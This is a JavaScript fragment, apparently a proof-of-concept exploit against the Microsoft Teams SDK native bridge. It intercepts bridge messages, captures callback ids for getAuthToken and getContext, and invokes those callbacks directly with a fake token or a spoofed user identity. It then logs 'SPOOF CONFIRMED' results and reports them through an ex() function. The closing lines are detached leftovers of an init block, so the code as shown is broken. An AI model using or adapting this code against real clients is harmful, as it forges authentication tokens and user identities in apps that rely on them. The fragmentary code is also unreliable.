    var upn = ctx.user ? ctx.user.userPrincipalName : 'N/A';
    log('  UPN: ' + upn, 'crit');
    if (upn.indexOf('SPOOFED') !== -1 || upn.indexOf('attacker') !== -1) {
      log('!!! DIRECT CALLBACK SPOOF CONFIRMED !!!', 'crit');
      ex('t20-CB-CONTEXT-CONFIRMED', { upn: upn });
    }
    NI.framelessPostMessage = _orig;
  }).catch(function(e) {
    log('error: ' + e.message, 'fail');
    NI.framelessPostMessage = _orig;
  });

  setTimeout(function() { NI.framelessPostMessage = _orig; }, 12000);
}


function spoofCallbackAuth() {
  log('\n' + '='.repeat(60), 'crit');
  log('METHOD 3: NI.callbacks[id] — auth token callback', 'crit');
  log('='.repeat(60), 'crit');

  if (!NI) { log('No NI', 'fail'); return; }

  var capturedId = null;
  var _orig = NI.framelessPostMessage;

  NI.framelessPostMessage = function(msg) {
    try {
      var parsed = JSON.parse(msg);
      if (parsed.func === 'authentication.getAuthToken') {
        capturedId = parsed.id;
        log('Captured getAuthToken id=' + capturedId, 'crit');
      }
    } catch(e) {}
    var result = _orig.apply(this, arguments);

    if (capturedId !== null && !spoofCallbackAuth._tried) {
      spoofCallbackAuth._tried = true;
      setTimeout(function() {
        var cb = NI.callbacks[capturedId];
        if (cb) {
          log('Auth callback EXISTS!', 'crit');
          // Pass raw fake token — catch block in callback returns [true, rawToken]
          try {
            cb.call(NI, FAKE_TOKEN);
            log('  Auth callback invoked!', 'crit');
            ex('t20-cb-auth-ok', { id: capturedId });
          } catch(e) {
            log('  error: ' + e.message, 'fail');
          }
        } else {
          log('Auth callback not found', 'warn');
        }
      }, 10);
    }

    return result;
  };
  spoofCallbackAuth._tried = false;

  microsoftTeams.authentication.getAuthToken().then(function(token) {
    log('\n*** getAuthToken() RESOLVED ***', 'crit');
    log('  Token: ' + String(token).substring(0, 120), 'crit');
    if (String(token).indexOf('ATTACKER') !== -1) {
      log('!!! DIRECT CALLBACK AUTH SPOOF CONFIRMED !!!', 'crit');
      ex('t20-CB-AUTH-CONFIRMED', { token: String(token).substring(0, 200) });
    }
    NI.framelessPostMessage = _orig;
  }).catch(function(e) {
    log('error: ' + e.message, 'fail');
    NI.framelessPostMessage = _orig;
  });

  setTimeout(function() { NI.framelessPostMessage = _orig; }, 12000);
}

function dumpBridge() {
  log('\n=== BRIDGE DUMP ===', 'info');
  if (!NI) { log('No NI', 'fail'); return; }

  var props = Object.getOwnPropertyNames(NI);
  log('NI has ' + props.length + ' properties', 'info');

  // Check which bridge version is loaded
  var hasBridgeScript = NI.postSdkResponseWithId && NI.postSdkResponseWithId.length === 4;
  var hasJSWebModule = NI.postSdkResponseWithId && NI.postSdkResponseWithId.length === 3;
  log('postSdkResponseWithId.length = ' + (NI.postSdkResponseWithId ? NI.postSdkResponseWithId.length : 'N/A'), 'crit');
  log('Bridge type: ' + (hasBridgeScript ? 'BridgeScript (4 args, UUID)' : hasJSWebModule ? 'JSWebModule (3 args, numeric)' : 'UNKNOWN'), 'crit');

  // handleResponseFromNative signature
  log('handleResponseFromNative.length = ' + (NI.handleResponseFromNative ? NI.handleResponseFromNative.length : 'N/A'), 'crit');

  // Callbacks
  var cbKeys = Object.keys(NI.callbacks || {});
  log('NI.callbacks: ' + cbKeys.length + ' keys [' + cbKeys.join(', ') + ']', cbKeys.length > 0 ? 'crit' : 'warn');

  // Handlers
  var hKeys = Object.keys(NI.handlers || {});
  log('NI.handlers: ' + hKeys.length + ' keys [' + hKeys.join(', ') + ']', hKeys.length > 0 ? 'crit' : 'info');

  // window.onNativeMessage
  log('window.onNativeMessage: ' + typeof window.onNativeMessage, typeof window.onNativeMessage === 'function' ? 'crit' : 'warn');

  ex('t20-bridge-dump', {
    props: props.length,
    psdriLen: NI.postSdkResponseWithId ? NI.postSdkResponseWithId.length : -1,
    hrfnLen: NI.handleResponseFromNative ? NI.handleResponseFromNative.length : -1,
    cbKeys: cbKeys.join(','),
    hKeys: hKeys.join(','),
    onNativeMsg: typeof window.onNativeMessage
  });
}

function dumpOnNativeMessage() {
  log('\n=== window.onNativeMessage CHECK ===', 'info');
  log('typeof: ' + typeof window.onNativeMessage, typeof window.onNativeMessage === 'function' ? 'crit' : 'warn');

  if (typeof window.onNativeMessage === 'function') {
    log('Source: ' + String(window.onNativeMessage).substring(0, 300), 'info');
    ex('t20-onm-exists', { src: String(window.onNativeMessage).substring(0, 500) });
  } else {
    log('NOT AVAILABLE — SDK may use a different message handler', 'warn');
    // Check for alternatives
    var alts = ['onNativeMessage', 'onmessage', 'teamsMessage', '_onNativeMessage'];
    for (var i = 0; i < alts.length; i++) {
      if (typeof window[alts[i]] === 'function') {
        log('  window.' + alts[i] + ' EXISTS!', 'crit');
      }
    }
  }
}

function captureInit() {
  log('\n=== Re-capturing init data ===', 'info');
  log('Captured requests so far: ' + capturedRequests.length, 'info');
  for (var i = 0; i < capturedRequests.length; i++) {
    var r = capturedRequests[i];
    log('  [' + i + '] id=' + r.id + ' uuid=' + (r.uuid || 'none') + ' func=' + r.func, 'info');
  }
  log('NI.callbacks keys: ' + Object.keys(NI.callbacks || {}).join(', '), 'crit');
}

      log('SDK OK: ' + ctx.user.userPrincipalName + ' | ' + ctx.app.host.clientType, 'ok');

      log('\nReady. Run DUMP BRIDGE first, then spoof methods.', 'ok');
      log('Method 1 (onNativeMessage) is most likely to work.', 'warn');

      ex('t20-init', {
        user: ctx.user.userPrincipalName,
        host: ctx.app.host.clientType,
        ni: !!NI,
        onNM: typeof window.onNativeMessage,
        requests: capturedRequests.length
      });

      log('SDK init error: ' + e.message, 'fail');
    }
  })();
};
